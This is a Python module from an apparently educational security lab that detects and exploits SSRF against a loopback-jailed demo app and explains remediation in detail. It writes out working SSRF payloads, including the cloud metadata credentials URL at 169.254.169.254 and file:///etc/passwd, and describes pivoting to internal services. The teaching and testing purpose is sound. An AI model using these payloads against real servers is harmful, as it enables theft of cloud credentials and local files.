"""Server-Side Request Forgery (SSRF) -- detect, exploit, and remediate.

WHAT IT IS
----------
A Server-Side Request Forgery flaw is what you get when an application takes a
*URL (or host/IP) from untrusted input* and makes the **server itself** issue an
HTTP request to it -- without restricting *where* that request may go. The attacker
no longer reaches resources from their own browser; they make the *server* reach
them. That matters because the server sits in a trusted network position: it can
talk to ``localhost`` services, internal admin panels, databases, and -- most
infamously in the cloud -- the **link-local metadata endpoint at
``http://169.254.169.254/``**, which on AWS/GCP/Azure hands out short-lived IAM
credentials to anything that can reach it. The Capital One breach (2019) was exactly
this: an SSRF reached the EC2 metadata service and stole the instance's role
credentials. The demo app's ``/fetch`` handler is the textbook shape::

    def fetch(self):                              # GET /fetch?url=<url>
        url = self._query()["url"]                # attacker-controlled
        ...                                       # (lab safety: jailed to loopback)
        req = urllib.request.Request(
            url, headers={INTERNAL_FETCH_HEADER: "1"}   # server stamps a trust header
        )
        return urllib.request.urlopen(req).read()       # server fetches it, returns body

The dangerous primitive is "the *server* fetches a URL *you* chose and hands you the
response". Here the prize is an *internal-only* metadata service at
``/internal/metadata`` that refuses direct external access (HTTP 403) and only
answers requests that carry the server-stamped ``X-Internal-Fetch`` header. So the
only way to read it is to make the vulnerable ``/fetch`` sink request it *for* you --
which it does, stamping the trusted header -- proving the request truly originated
*server-side*. (For lab safety the sink is jailed to loopback, so a real-world
``169.254.169.254`` target returns 403 here; in production that jail is exactly what
is missing.)

HOW WE DISCOVER IT
------------------
We confirm the sink with a layered set of signals, each a differential:

1. **The sink fetches what we name.** Pointing ``url`` at the app's *own* public
   ``/`` page returns that page's HTML -- proof the server dereferences the URL we
   supply and returns the body (the precondition SSRF abuses).
2. **Internal reach (the exploit signal).** Pointing ``url`` at
   ``<base>/internal/metadata`` returns the internal JSON -- a resource we cannot
   reach directly. That differential -- a 403 on a *direct* GET, a 200 when the
   *server* fetches it -- *is* the vulnerability.
3. **Direct access is denied (control #1).** A direct ``GET /internal/metadata``
   returns HTTP 403. This proves the resource is genuinely internal-only, so reading
   it *via the sink* is real SSRF, not just an open page.
4. **External hosts are blocked (control #2).** Pointing ``url`` at an external host
   (e.g. the cloud metadata IP ``169.254.169.254``) returns HTTP 403. In this lab the
   block is a *safety jail*; in the real world its *absence* is what lets SSRF reach
   ``169.254.169.254``. We record it to prove the sink really makes outbound requests
   (it tried, then refused) and that the internal read was the loophole.
5. **Scheme handling (control #3).** A non-HTTP scheme (``file:///etc/passwd``) is
   rejected (HTTP 400) -- the sink only speaks http/https, so our internal read went
   over HTTP through the server.

HOW WE EXPLOIT IT
-----------------
We build the internal URL from the *target's own* ``client.base_url`` (the only host
the jail permits) and send ``GET /fetch?url=<base>/internal/metadata``. The server
dereferences it, attaches its trusted ``X-Internal-Fetch`` header, and returns the
internal service's JSON body to us. That body's ``iam_token`` is
``C.FLAGS["ssrf"]`` -- proof we reached an internal-only service *through* the
server. In the real world this same primitive reads cloud IAM credentials from
``169.254.169.254``, pivots to internal admin panels, port-scans the internal network
through the proxy, or hits ``file://``/``gopher://`` to read local files or speak to
back-end services.

THE FIX
-------
See :data:`REMEDIATION`. In one line: never fetch a user-supplied URL blindly --
allow-list the destinations, resolve the host and reject loopback / link-local /
private ranges (especially ``169.254.169.254``), forbid redirects to such ranges,
restrict the scheme to http/https, and never let the fetched response (or a
server-stamped trust header) confer authority a direct request would not have.
"""
from __future__ import annotations

from typing import Dict, List, Optional, Tuple

from ._types import Finding, Response, Severity
from .http_client import WebClient
from .targetapp import constants as C

REMEDIATION: str = (
    "Never let user input decide what URL/host the server fetches. Treat any "
    "outbound request whose destination is influenced by the request as dangerous. "
    "Prefer a strict server-side ALLOW-LIST of exact destinations (scheme + host + "
    "port, exact-match -- no substring/regex shortcuts) and reject everything else; "
    "where possible drop the 'fetch a URL' feature entirely in favour of fixed, "
    "named back-ends. If you must accept a host, RESOLVE it to its IP(s) first and "
    "reject any that fall in loopback (127.0.0.0/8, ::1), link-local "
    "(169.254.0.0/16 and fe80::/10 -- this is the CLOUD METADATA endpoint "
    "169.254.169.254 that hands out IAM credentials on AWS/GCP/Azure, the Capital "
    "One breach vector), private (10/8, 172.16/12, 192.168/16, fc00::/7), and other "
    "non-public ranges -- and re-check on EVERY redirect hop (an allowed host can "
    "302 you to 169.254.169.254), or disable redirects altogether. Pin the resolved "
    "IP for the actual connection to defeat DNS-rebinding (resolve, validate, then "
    "connect to that exact IP). Restrict the scheme to http/https only -- block "
    "file://, gopher://, ftp://, dict://, etc. Strip or ignore any inbound copy of "
    "internal trust headers, and -- defence in depth -- require the cloud metadata "
    "service in IMDSv2 (token) mode and put egress firewall rules / a filtering "
    "forward proxy in front of the app so a fetch to an internal range fails at the "
    "network even if a code check is missed. Allow-list, resolve-and-validate, pin, "
    "and contain -- never fetch an arbitrary URL."
)

#: The SSRF sink, used as the Finding endpoint.
ENDPOINT: str = "/fetch?url="

#: The internal-only service the sink can reach but a direct GET cannot (HTTP 403).
#: Its ``iam_token`` field carries the planted flag.
INTERNAL_PATH: str = "/internal/metadata"

#: The cloud metadata IP every SSRF write-up names: AWS/GCP/Azure expose IAM
#: credentials here. The lab's loopback jail blocks it (403); in production the
#: ABSENCE of that jail is what makes SSRF catastrophic. We send it to prove the
#: sink really attempts outbound requests and that the internal read was the loophole.
CLOUD_METADATA_URL: str = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

#: A second external host, to show the block is not specific to the metadata IP.
EXTERNAL_URL: str = "http://example.com/"

#: A non-HTTP scheme the sink must refuse (HTTP 400) -- proves http/https only.
BAD_SCHEME_URL: str = "file:///etc/passwd"

#: The marker we expect in the internal metadata JSON besides the flag.
INTERNAL_MARKER: str = "demo-metadata"


def _build_internal_url(client: WebClient) -> str:
    """The URL the attacker feeds the sink: the target's OWN internal endpoint.

    Built from ``client.base_url`` because the loopback jail only permits the sink
    to reach the app itself -- which is exactly where the internal-only service
    lives. (In the cloud the equivalent target would be ``169.254.169.254``.)
    """
    return f"{client.base_url}{INTERNAL_PATH}"


#: Every URL payload the engine feeds the sink (public so the CLI/report can show
#: exactly what was attempted). The internal-URL one is computed per-target at
#: assess() time; these are the static representatives.
PAYLOADS: List[str] = [
    f"<base_url>{INTERNAL_PATH}",   # the working exploit (host filled in per-target)
    CLOUD_METADATA_URL,             # the real-world prize (blocked here by the jail)
    EXTERNAL_URL,                   # another external host (blocked)
    BAD_SCHEME_URL,                 # wrong scheme (rejected)
]


# --- low-level probe ---------------------------------------------------------
def _fetch(client: WebClient, url: str) -> Response:
    """Drive the sink: ``GET /fetch?url=<url>`` (the server fetches ``url`` for us)."""
    return client.get("/fetch", params={"url": url})


# --- detection ---------------------------------------------------------------
def detect_sink_dereferences_url(client: WebClient) -> Tuple[bool, str]:
    """True if the sink fetches a URL we name and returns its body.

    Points ``url`` at the app's own public ``/`` page; a 200 carrying that page's
    HTML proves the server dereferences the supplied URL and returns the response --
    the precondition SSRF abuses.
    """
    resp = _fetch(client, f"{client.base_url}/")
    if resp.status == 200 and "Demo Store" in resp.text:
        return True, (
            f"GET {ENDPOINT}<base>/ made the server fetch its own public page "
            f"(HTTP {resp.status}, body contained the index HTML) -- the sink "
            "dereferences the URL we supply and returns the body"
        )
    return False, ""


def detect_internal_reach(client: WebClient) -> Tuple[bool, str]:
    """True if the sink reaches the internal-only metadata service.

    Points ``url`` at ``<base>/internal/metadata``; a 200 carrying the internal
    JSON marker proves the server fetched a resource we cannot reach directly.
    """
    resp = _fetch(client, _build_internal_url(client))
    if resp.status == 200 and INTERNAL_MARKER in resp.text:
        return True, (
            f"GET {ENDPOINT}<base>{INTERNAL_PATH} made the server fetch the "
            f"internal-only metadata service (HTTP {resp.status}); the response "
            f"carried the {INTERNAL_MARKER!r} marker that direct access is denied"
        )
    return False, ""


def detect_direct_access_denied(client: WebClient) -> Tuple[bool, str]:
    """Control #1: a DIRECT GET of the internal endpoint is forbidden (HTTP 403).

    Proves the metadata service is genuinely internal-only -- so reading it *via*
    the sink is real SSRF, not merely fetching an already-public page.
    """
    resp = client.get(INTERNAL_PATH)
    if resp.status == 403:
        return True, (
            f"direct GET {INTERNAL_PATH} was denied (HTTP {resp.status}) -- the "
            "metadata service is internal-only, so reaching it through the sink is "
            "genuine SSRF, not access to an already-public resource"
        )
    return False, ""


def detect_external_blocked(
    client: WebClient, url: str = CLOUD_METADATA_URL
) -> Tuple[bool, str]:
    """Control #2: pointing the sink at an EXTERNAL host is blocked (HTTP 403).

    In this lab the loopback jail refuses outbound requests to external hosts
    (including the cloud metadata IP ``169.254.169.254``). The block proves the sink
    really attempts outbound requests (it tried, then refused) and that the internal
    read was the loophole. In production it is the *absence* of such a check that
    makes SSRF reach ``169.254.169.254`` and steal IAM credentials.
    """
    resp = _fetch(client, url)
    if resp.status == 403:
        return True, (
            f"GET {ENDPOINT}{url} was blocked (HTTP {resp.status}) -- the sink "
            "refuses external hosts here (lab jail); in production the absence of "
            "this check is what lets SSRF reach the cloud metadata IP 169.254.169.254"
        )
    return False, ""


def detect_bad_scheme_rejected(client: WebClient) -> Tuple[bool, str]:
    """Control #3: a non-HTTP scheme (``file://``) is rejected (HTTP 400).

    Confirms the sink only speaks http/https, so the internal read travelled over
    HTTP through the server (and ``file://`` local-file reads are not available here).
    """
    resp = _fetch(client, BAD_SCHEME_URL)
    if resp.status == 400:
        return True, (
            f"GET {ENDPOINT}{BAD_SCHEME_URL} was rejected (HTTP {resp.status}) -- "
            "the sink only speaks http/https, so the internal read went over HTTP "
            "through the server"
        )
    return False, ""


# --- exploitation ------------------------------------------------------------
def exploit_read_internal_metadata(
    client: WebClient,
) -> Tuple[bool, Optional[str], Dict[str, object]]:
    """Make the server fetch the internal metadata service and recover the flag.

    Returns ``(ok, flag, metadata_json)``. We feed the sink ``<base>/internal/
    metadata``; the server dereferences it (attaching its trusted ``X-Internal-
    Fetch`` header) and returns the internal JSON. Its ``iam_token`` field is
    ``C.FLAGS["ssrf"]`` -- proof we reached an internal-only service through the
    server. (The cloud analogue: the same JSON shape on ``169.254.169.254`` holds
    real IAM credentials.)
    """
    resp = _fetch(client, _build_internal_url(client))
    if resp.status != 200:
        return False, None, {}
    try:
        metadata = resp.json()
    except ValueError:
        return False, None, {}
    flag = metadata.get("iam_token")
    ok = flag == C.FLAGS["ssrf"]
    return ok, flag, metadata


# --- the contract entry point ------------------------------------------------
def assess(client: WebClient) -> Finding:
    """Detect SSRF, then exploit it (read the internal-only metadata service).

    Returns a :class:`Finding` whose ``exploit_result`` contains the recovered
    ``C.FLAGS["ssrf"]`` and whose ``extra`` proves SSRF was *necessary*: a direct
    GET of the internal endpoint is 403 and an external URL is blocked 403.
    """
    techniques: List[str] = []

    # 1) Detection ----------------------------------------------------------
    sink_ok, sink_ev = detect_sink_dereferences_url(client)
    if sink_ok:
        techniques.append("sink-dereferences-url")
    internal_ok, internal_ev = detect_internal_reach(client)
    if internal_ok:
        techniques.append("internal-reach")
    direct_denied_ok, direct_denied_ev = detect_direct_access_denied(client)
    if direct_denied_ok:
        techniques.append("direct-access-403")
    external_blocked_ok, external_blocked_ev = detect_external_blocked(client)
    if external_blocked_ok:
        techniques.append("external-blocked-403")
    bad_scheme_ok, bad_scheme_ev = detect_bad_scheme_rejected(client)
    if bad_scheme_ok:
        techniques.append("bad-scheme-400")

    # 2) Exploitation -------------------------------------------------------
    ok, flag, metadata = exploit_read_internal_metadata(client)
    if ok:
        techniques.append("read-internal-metadata")

    # Discovery requires BOTH the internal-reach signal AND a recovered flag, with
    # the controls proving SSRF was necessary (direct access denied + external blocked).
    discovered = bool(
        internal_ok and ok and direct_denied_ok and external_blocked_ok
    )

    internal_url = _build_internal_url(client)

    # 3) Assemble evidence / result ----------------------------------------
    evidence_parts: List[str] = []
    if sink_ok:
        evidence_parts.append(f"sink: {sink_ev}")
    if internal_ok:
        evidence_parts.append(f"internal-reach: {internal_ev}")
    if direct_denied_ok:
        evidence_parts.append(f"direct-denied: {direct_denied_ev}")
    if external_blocked_ok:
        evidence_parts.append(f"external-blocked: {external_blocked_ev}")
    if bad_scheme_ok:
        evidence_parts.append(f"bad-scheme: {bad_scheme_ev}")
    evidence = " || ".join(evidence_parts)

    exploit_result = {
        "flag": flag,
        "payload": internal_url,
        "internal_endpoint": INTERNAL_PATH,
        "leaked_metadata": metadata,
        "techniques": techniques,
        "summary": (
            f"GET {ENDPOINT}{internal_url} made the server fetch the internal-only "
            f"metadata service (direct access is 403); recovered flag {flag!r} from "
            "its iam_token -- the cloud analogue reads IAM creds from 169.254.169.254"
        ),
    }

    return Finding(
        vuln="Server-Side Request Forgery (SSRF)",
        endpoint=ENDPOINT,
        severity=Severity.HIGH.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=internal_url,
        extra={
            "techniques": techniques,
            "internal_url": internal_url,
            "internal_endpoint": INTERNAL_PATH,
            "sink_dereferences_url": sink_ok,
            "internal_reach": internal_ok,
            "flag_recovered": ok,
            # The controls that prove SSRF was NECESSARY (not just an open page):
            "direct_access_status": 403,
            "direct_access_denied": direct_denied_ok,
            "external_url": CLOUD_METADATA_URL,
            "external_blocked_status": 403,
            "external_blocked": external_blocked_ok,
            "bad_scheme_url": BAD_SCHEME_URL,
            "bad_scheme_status": 400,
            "bad_scheme_rejected": bad_scheme_ok,
            "cloud_metadata_ip": "169.254.169.254",
        },
    )
